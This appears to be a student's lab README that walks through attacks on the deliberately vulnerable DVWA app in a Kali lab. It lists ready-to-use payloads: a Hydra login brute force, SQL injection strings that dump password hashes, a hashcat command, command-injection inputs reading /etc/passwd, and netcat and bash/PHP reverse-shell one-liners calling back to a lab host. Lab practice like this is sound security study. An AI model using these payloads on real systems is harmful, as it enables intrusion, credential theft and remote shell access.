This folder contains my complete walkthrough of testing the Damn Vulnerable Web Application inside a Kali Linux lab. I installed Apache, PHP, and MariaDB, configured DVWA, and went through real attack paths to understand both attacker workflow and the defensive view through logs and alerts.

---

## What I Did

### Setup
- Kali Linux configured for web testing  
- Apache, PHP, and MariaDB installed  
- DVWA placed in the web root  
- Database created for DVWA  
- DVWA security level set to low  

---

## Attacks Performed

### Hydra Brute Force  
Tested weak authentication by brute forcing the DVWA login.

### Burp Suite Request Interception  
Captured login traffic, analyzed POST parameters, and studied request behavior.

### SQL Injection  
Used basic and UNION based SQL injection to dump user records and extract password hashes.

### Hash Cracking  
Cracked MD5 password hashes retrieved from DVWA.

### Command Injection  
Executed OS commands through the vulnerable ping feature.

### Outbound Network Test  
Used Netcat to confirm outbound connections to my Kali machine.

### File Upload Exploit  
Uploaded a PHP webshell and executed system commands by passing them through the `cmd` parameter in the URL to obtain RCE.

## DVWA Payloads

### Hydra Brute Force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

---

### SQL Injection Payloads
' OR '1'='1  
' UNION SELECT user, password FROM users #  
' UNION SELECT user, password FROM users --  
' UNION ALL SELECT user, password FROM users --  
' UNION SELECT 1,2 --  

---

### Hash Cracking (Hashcat)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt  
echo -n "password" | md5sum  

---

### Command Injection Payloads
127.0.0.1; ls  
127.0.0.1; ls -la  
127.0.0.1; whoami  
127.0.0.1; uname -a  
127.0.0.1; pwd  
127.0.0.1; ps aux  
127.0.0.1; cat /etc/passwd  

---

### Outbound Connection Test
127.0.0.1; echo test | nc 192.168.18.128 4444  
127.0.0.1; nc 192.168.18.128 4444 <<< "hello"  
127.0.0.1; nc -v 192.168.18.128 4444 <<< test  

---

### Reverse Shell Attempts (for documentation)
127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.18.128/4444 0>&1'  
127.0.0.1; nc 192.168.18.128 4444 -e /bin/bash  
127.0.0.1; php -r '$sock=fsockopen("192.168.18.128",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
